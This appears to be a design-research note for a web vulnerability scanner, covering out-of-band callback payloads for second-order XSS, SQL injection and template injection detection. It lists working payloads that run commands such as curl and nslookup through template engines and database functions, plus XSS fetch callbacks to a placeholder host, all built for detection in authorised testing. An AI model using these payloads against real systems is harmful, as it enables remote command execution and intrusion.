# Phase 6: Vulnerability Payloads - Research

**Researched:** 2026-01-30
**Domain:** XSS/SQLi/SSTI callback payloads for second-order vulnerability detection
**Confidence:** HIGH

## Summary

This phase focuses on generating context-appropriate payloads for XSS, SQLi, and SSTI detection via out-of-band (OOB) callbacks. The research establishes that effective second-order vulnerability detection requires payloads that "phone home" rather than cause visible application changes.

Key findings:
1. **XSS callbacks** rely on browser-executable JavaScript or HTML elements that trigger HTTP requests (img src, script src, fetch API)
2. **SQLi OOB callbacks** depend on database-specific features (xp_dirtree for MSSQL, LOAD_FILE for MySQL, UTL_HTTP for Oracle, dblink for PostgreSQL)
3. **SSTI callbacks** require template engine command execution to run curl/wget/nslookup
4. **Polyglots** reduce testing effort but sacrifice precision - best used for initial detection before targeted payloads

**Primary recommendation:** Implement a layered payload system with (1) universal polyglots for initial fuzzing, (2) context-specific payloads for confirmed vector types, and (3) database/engine-specific OOB payloads for blind scenarios.

## Standard Stack

The established patterns for callback-based vulnerability detection:

### Core Payload Categories
| Category | Primary Technique | Callback Mechanism | Context |
|----------|------------------|-------------------|---------|
| XSS | Event handlers, script injection | HTTP request via JS | Browser execution |
| SQLi OOB | Database-specific functions | DNS lookup, HTTP request | DB server execution |
| SSTI | Command execution in templates | curl/wget/nslookup | Server execution |
| Polyglot | Multi-context syntax | Depends on resolved context | Unknown context |

### Supporting Infrastructure (Already Built)
| Component | Purpose | Integration Point |
|-----------|---------|-------------------|
| HTTP Callback Server | Captures XSS/SSTI HTTP callbacks | `{{CALLBACK}}` substitution |
| DNS Callback Server | Captures SQLi DNS callbacks | Subdomain-based correlation |
| Interactsh Client | External callback infrastructure | For firewalled targets |
| Correlation IDs | Tracks which payload triggered | 16-char hex in URL path |

### Payload File Format
```
# Comment lines start with #
# Blank lines are skipped
# {{CALLBACK}} placeholder replaced with callback URL + correlation ID

<img src=x onerror="fetch('{{CALLBACK}}')">
```

## Architecture Patterns

### Recommended Payload Organization
```
ricochet/
  payloads/
    __init__.py           # Payload generator classes
    xss.py               # XSS payload generators
    sqli.py              # SQLi OOB payload generators
    ssti.py              # SSTI payload generators
    polyglot.py          # Cross-context polyglots
    builtin/             # Default payload files
      xss-callback.txt
      sqli-dns-mssql.txt
      sqli-dns-mysql.txt
      sqli-dns-oracle.txt
      sqli-dns-postgres.txt
      ssti-jinja2.txt
      ssti-freemarker.txt
      ssti-twig.txt
      polyglot-detection.txt
```

### Pattern 1: Payload Generator Interface
**What:** Abstract base for generating payloads with callback substitution
**When to use:** All payload generation
**Example:**
```python
# Source: Ricochet existing pattern
from abc import ABC, abstractmethod
from typing import Iterator

class PayloadGenerator(ABC):
    """Base class for payload generators."""

    @abstractmethod
    def generate(self, callback_url: str) -> Iterator[tuple[str, str]]:
        """Yield (payload, metadata) tuples with callback substituted."""
        pass

    @property
    @abstractmethod
    def vuln_type(self) -> str:
        """Return vulnerability type: 'xss', 'sqli', 'ssti', 'polyglot'."""
        pass
```

### Pattern 2: Context-Specific Payload Selection
**What:** Choose payloads based on injection context
**When to use:** When vector location is known (header vs body vs query)
**Example:**
```python
# Context-aware payload selection
def get_payloads_for_context(
    vuln_type: str,
    context: str  # 'html', 'js', 'attr', 'header', 'json'
) -> list[str]:
    """Return payloads appropriate for the injection context."""
    # XSS in HTML body: full tags work
    # XSS in JS context: need to break out of string
    # XSS in attribute: need to close attribute first
    pass
```

### Pattern 3: Database-Agnostic SQLi with Fallback
**What:** Try multiple database-specific payloads when DB type unknown
**When to use:** Blind SQLi detection
**Example:**
```python
# Try all DB-specific OOB payloads
SQLI_OOB_PAYLOADS = {
    'mssql': "'; master..xp_dirtree '\\\\{{CALLBACK}}\\x'; --",
    'mysql': "' AND LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.{{CALLBACK}}\\\\x'))-- ",
    'oracle': "' || UTL_HTTP.REQUEST('http://{{CALLBACK}}') || '",
    'postgres': "'; COPY (SELECT '') TO PROGRAM 'curl {{CALLBACK}}'; --",
}
```

### Anti-Patterns to Avoid
- **Over-encoding payloads:** Let the injector handle URL/HTML encoding based on context
- **Destructive payloads:** DROP TABLE, DELETE, etc. - detection only, no damage
- **Long payloads without purpose:** Each character increases detection chance by WAFs
- **Single-database assumptions:** Always include payloads for major DBs

## Don't Hand-Roll

Problems that look simple but have existing solutions:

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| XSS payload list | Custom list from scratch | PayloadsAllTheThings | Thousands of tested payloads, WAF bypasses |
| SQLi OOB techniques | Invented approaches | NotSoSecure OOB cheatsheet | DB-specific edge cases are complex |
| SSTI engine detection | Manual fingerprinting | Hackmanit polyglots | 51 engines tested systematically |
| Character encoding | Manual escaping | Existing URL/HTML encoders | Context-specific encoding is error-prone |
| WAF bypass variants | Ad-hoc obfuscation | Published bypass techniques | Researchers spend years on these |

**Key insight:** Vulnerability payloads are heavily researched by the security community. Use established payload sets rather than inventing new ones.

## Common Pitfalls

### Pitfall 1: Forgetting Context-Specific Encoding
**What goes wrong:** Payload works in test but fails in real injection because of encoding issues
**Why it happens:** `<script>` in JSON needs different escaping than in HTML body
**How to avoid:** Apply encoding at injection time, not payload generation time
**Warning signs:** Payloads containing pre-encoded characters like `%3C` or `\u003c`

### Pitfall 2: SQLi DNS Label Limitations
**What goes wrong:** DNS exfiltration fails silently
**Why it happens:** DNS labels limited to 63 chars, alphanumeric + hyphen only, total 253 chars
**How to avoid:** Keep correlation IDs short (16 hex chars = safe), encode data as hex
**Warning signs:** Full domain names exceeding 253 characters

### Pitfall 3: SSTI Payload Index Variability
**What goes wrong:** `__subclasses__()[396]` works on one system, fails on another
**Why it happens:** Python subclass indices vary by version and loaded modules
**How to avoid:** Use multiple index attempts or named class lookups
**Warning signs:** Hard-coded subclass indices in payloads

### Pitfall 4: XSS HttpOnly Cookie Assumption
**What goes wrong:** XSS payload steals document.cookie but gets nothing
**Why it happens:** Modern apps use HttpOnly cookies
**How to avoid:** Detection payloads should just callback, not steal cookies
**Warning signs:** Payloads that assume document.cookie has session data

### Pitfall 5: SQLi Privilege Requirements
**What goes wrong:** OOB SQLi payload runs but no callback received
**Why it happens:** xp_dirtree requires sysadmin, LOAD_FILE requires FILE privilege
**How to avoid:** Include multiple techniques per database, document requirements
**Warning signs:** Relying on single OOB technique per database

## Code Examples

### XSS Callback Payloads (Verified)
```python
# Source: PayloadsAllTheThings, PortSwigger Cheat Sheet
XSS_CALLBACK_PAYLOADS = [
    # Image onerror - works without user interaction
    '<img src=x onerror="fetch(\'{{CALLBACK}}\')">',
    '<img src=x onerror="new Image().src=\'{{CALLBACK}}\'">',

    # Script src - external script load
    '<script src="{{CALLBACK}}"></script>',

    # SVG onload - inline execution
    '<svg onload="fetch(\'{{CALLBACK}}\')">',

    # Body/div with autofocus - no click required
    '<input onfocus="fetch(\'{{CALLBACK}}\')" autofocus>',
    '<div contenteditable onfocus="fetch(\'{{CALLBACK}}\')" autofocus></div>',

    # Iframe - loads external resource
    '<iframe src="{{CALLBACK}}"></iframe>',

    # Video/audio error handlers
    '<video src=x onerror="fetch(\'{{CALLBACK}}\')">',
    '<audio src=x onerror="fetch(\'{{CALLBACK}}\')">',

    # Object tag
    '<object data="{{CALLBACK}}">',

    # CSS import (works in some contexts)
    '<style>@import url("{{CALLBACK}}")</style>',
]
```

### SQLi OOB Payloads (Verified)
```python
# Source: NotSoSecure OOB Cheatsheet, PortSwigger
SQLI_OOB_MSSQL = [
    # xp_dirtree DNS lookup (requires sysadmin)
    "'; master..xp_dirtree '\\\\{{CALLBACK}}\\x'; --",
    "' master..xp_dirtree '\\\\{{CALLBACK}}\\x'; --",
    "1; master..xp_dirtree '\\\\{{CALLBACK}}\\x'; --",

    # xp_fileexist alternative
    "'; master..xp_fileexist '\\\\{{CALLBACK}}\\x'; --",
]

SQLI_OOB_MYSQL = [
    # LOAD_FILE DNS lookup (requires FILE privilege)
    "' AND LOAD_FILE(CONCAT('\\\\\\\\{{CALLBACK}}\\\\x'))-- ",
    "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\{{CALLBACK}}\\\\x'))-- ",
    "1 AND LOAD_FILE(CONCAT('\\\\\\\\{{CALLBACK}}\\\\x'))-- ",
]

SQLI_OOB_ORACLE = [
    # UTL_HTTP (requires permission on UTL_HTTP)
    "' || UTL_HTTP.REQUEST('http://{{CALLBACK}}') || '",
    "' UNION SELECT UTL_HTTP.REQUEST('http://{{CALLBACK}}') FROM DUAL-- ",

    # UTL_INADDR DNS
    "' || UTL_INADDR.GET_HOST_ADDRESS('{{CALLBACK}}') || '",

    # DBMS_LDAP.INIT
    "' || DBMS_LDAP.INIT(('{{CALLBACK}}',80)) || '",
]

SQLI_OOB_POSTGRES = [
    # dblink extension (requires superuser or dblink extension)
    "'; SELECT dblink_connect('host={{CALLBACK}} dbname=x'); --",

    # COPY TO PROGRAM (requires superuser, PostgreSQL 9.3+)
    "'; COPY (SELECT '') TO PROGRAM 'curl http://{{CALLBACK}}'; --",
    "'; COPY (SELECT '') TO PROGRAM 'nslookup {{CALLBACK}}'; --",
]
```

### SSTI Callback Payloads (Verified)
```python
# Source: PayloadsAllTheThings, Hackmanit
SSTI_JINJA2 = [
    # Using lipsum global (context-free, shortest)
    '{{ lipsum.__globals__["os"].popen("curl {{CALLBACK}}").read() }}',
    '{{ lipsum.__globals__["os"].popen("wget {{CALLBACK}}").read() }}',
    '{{ lipsum.__globals__["os"].popen("nslookup {{CALLBACK}}").read() }}',

    # Using cycler object
    '{{ cycler.__init__.__globals__.os.popen("curl {{CALLBACK}}").read() }}',

    # Using self
    '{{ self.__init__.__globals__.__builtins__.__import__("os").popen("curl {{CALLBACK}}").read() }}',
]

SSTI_FREEMARKER = [
    # Assign and use class
    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl {{CALLBACK}}")}',
    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("wget {{CALLBACK}}")}',
    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("nslookup {{CALLBACK}}")}',

    # Alternative syntax
    '${"freemarker.template.utility.Execute"?new()("curl {{CALLBACK}}")}',
]

SSTI_TWIG = [
    # Using sort filter with system (Twig 1.x and 2.x)
    "{{ ['curl {{CALLBACK}}','']|sort('system') }}",
    "{{ ['wget {{CALLBACK}}','']|sort('system') }}",
    "{{ ['nslookup {{CALLBACK}}','']|sort('system') }}",

    # Using passthru
    "{{ ['curl {{CALLBACK}}','']|sort('passthru') }}",
]

SSTI_VELOCITY = [
    # Runtime.getRuntime
    '#set($p=$class.forName("java.lang.Runtime").getRuntime().exec("curl {{CALLBACK}}"))',
    '#set($p=$class.forName("java.lang.Runtime").getRuntime().exec("nslookup {{CALLBACK}}"))',
]
```

### Polyglot Detection Payloads (Verified)
```python
# Source: Hackmanit Template Injection Table
SSTI_POLYGLOTS = [
    # Universal error-based (works on 51/51 engines)
    "<%'${{/#{@}}%>{{",

    # Secondary polyglot (47/51 engines)
    "<%'${{#{@}}%>",

    # Non-error-based polyglots (for when errors are suppressed)
    'p ">[[${{1}}]]',
    '<%=1%>@*#{1}',
    '{##}/*{{.}}*/',
]

# XSS polyglot - works across HTML contexts
# Source: 0xsobky/HackVault
XSS_POLYGLOT = (
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/"
    "(/* */oNcliCk=fetch('{{CALLBACK}}') )//"
    "</stYle/</titLe/</teXtarEa/</scRipt/--!>"
    "<img/src=x onerror=fetch('{{CALLBACK}}')//>"
)

# SQLi polyglot - works across quote contexts
# Source: Mathias Karlsson
SQLI_POLYGLOT = "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/"
```

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| alert(1) XSS PoC | Callback-based detection | ~2018 | Proves execution without visible popup |
| In-band SQLi only | OOB/OAST techniques | ~2015 | Detects blind SQLi, async execution |
| Manual SSTI fingerprinting | Polyglot-first detection | 2023 | 51 engines with single payload |
| Single-context payloads | Polyglots + targeted | Ongoing | Reduces testing time 10-30x |

**Deprecated/outdated:**
- `document.cookie` exfiltration: HttpOnly cookies make this unreliable for detection
- Single-database SQLi payloads: Modern scanners test all major DBs
- Manual SSTI engine identification: Use polyglots first

## Minimum Viable Payload Set

For 80% coverage of real-world cases with minimal payloads:

### XSS (5 payloads)
```
<img src=x onerror="fetch('{{CALLBACK}}')">
<script src="{{CALLBACK}}"></script>
<svg onload="fetch('{{CALLBACK}}')">
<input onfocus="fetch('{{CALLBACK}}')">
<iframe src="{{CALLBACK}}">
```

### SQLi OOB (8 payloads - 2 per major DB)
```
# MSSQL
'; master..xp_dirtree '\\{{CALLBACK}}\x'; --
' master..xp_dirtree '\\{{CALLBACK}}\x'; --

# MySQL
' AND LOAD_FILE(CONCAT('\\\\{{CALLBACK}}\\x'))--
1 AND LOAD_FILE(CONCAT('\\\\{{CALLBACK}}\\x'))--

# Oracle
' || UTL_HTTP.REQUEST('http://{{CALLBACK}}') || '
' || UTL_INADDR.GET_HOST_ADDRESS('{{CALLBACK}}') || '

# PostgreSQL
'; COPY (SELECT '') TO PROGRAM 'nslookup {{CALLBACK}}'; --
'; SELECT dblink_connect('host={{CALLBACK}} dbname=x'); --
```

### SSTI (6 payloads - 2 per major engine)
```
# Jinja2
{{ lipsum.__globals__["os"].popen("curl {{CALLBACK}}").read() }}
{{ lipsum.__globals__["os"].popen("nslookup {{CALLBACK}}").read() }}

# Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl {{CALLBACK}}")}
${"freemarker.template.utility.Execute"?new()("nslookup {{CALLBACK}}")}

# Twig
{{ ['curl {{CALLBACK}}','']|sort('system') }}
{{ ['nslookup {{CALLBACK}}','']|sort('system') }}
```

### Polyglots (3 payloads)
```
# Universal SSTI detection
<%'${{/#{@}}%>{{

# XSS polyglot with callback
'--><img/src=x onerror=fetch('{{CALLBACK}}')>

# SQLi time-based polyglot (for detection, not OOB)
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

**Total: 22 payloads for broad vulnerability class coverage**

## Open Questions

Things that couldn't be fully resolved:

1. **Encoding at generation vs injection time**
   - What we know: Payloads need context-specific encoding
   - What's unclear: Should PayloadGenerator return raw payloads or handle encoding?
   - Recommendation: Return raw payloads, let Injector handle encoding based on vector.location

2. **Payload file vs programmatic generation**
   - What we know: Both approaches are used in the wild
   - What's unclear: Which is better for ricochet's use case?
   - Recommendation: Support both - built-in payloads as files, generators for customization

3. **DNS callback subdomain format**
   - What we know: Correlation ID should be first subdomain label
   - What's unclear: Best format for SQLi data exfiltration (hex encoding?)
   - Recommendation: For detection, just use correlation ID; leave data exfil for future

## Sources

### Primary (HIGH confidence)
- [PortSwigger XSS Cheat Sheet 2025](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) - XSS vectors, event handlers
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) - Data exfiltration patterns
- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) - Template engine payloads
- [NotSoSecure OOB Cheatsheet](https://notsosecure.com/out-band-exploitation-oob-cheatsheet) - SQLi OOB by database
- [Hackmanit Template Injection Table](https://cheatsheet.hackmanit.de/template-injection-table) - SSTI polyglots

### Secondary (MEDIUM confidence)
- [PortSwigger Blind SQLi OOB Lab](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band) - OOB technique verification
- [Intigriti Blind XSS Guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide) - Blind XSS detection patterns
- [Check Point SSTI Research 2024](https://research.checkpoint.com/2024/server-side-template-injection-transforming-web-applications-from-assets-to-liabilities/) - Modern SSTI techniques

### Tertiary (LOW confidence)
- XSS polyglot from 0xsobky/HackVault - Community-contributed, widely cited
- SQLi polyglot from Mathias Karlsson - Cited in multiple sources but not official docs

## Metadata

**Confidence breakdown:**
- XSS payloads: HIGH - Verified against PortSwigger and PayloadsAllTheThings
- SQLi OOB payloads: HIGH - Verified against NotSoSecure and PortSwigger
- SSTI payloads: HIGH - Verified against PayloadsAllTheThings Python/Java sections
- Polyglots: MEDIUM - Community-contributed, widely tested but no official source
- Minimum viable set: MEDIUM - Based on synthesis of sources, not empirical testing

**Research date:** 2026-01-30
**Valid until:** 2026-03-30 (60 days - payload techniques are relatively stable)
